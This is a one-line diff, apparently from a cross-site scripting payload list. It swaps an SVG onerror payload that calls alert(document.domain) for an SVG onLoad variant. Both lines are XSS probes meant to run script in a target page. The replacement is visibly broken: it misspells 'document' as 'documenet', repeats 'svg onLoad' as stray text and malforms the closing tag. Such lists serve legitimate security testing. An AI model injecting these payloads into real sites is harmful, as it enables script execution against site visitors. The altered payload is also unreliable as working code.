@@ -1,1 +1,1 @@
-<svg src=x onerror=alert(document.domain)>
+<svg onLoad svg onLoad="javascript:alert(documenet.domain)"></svg onLoad>
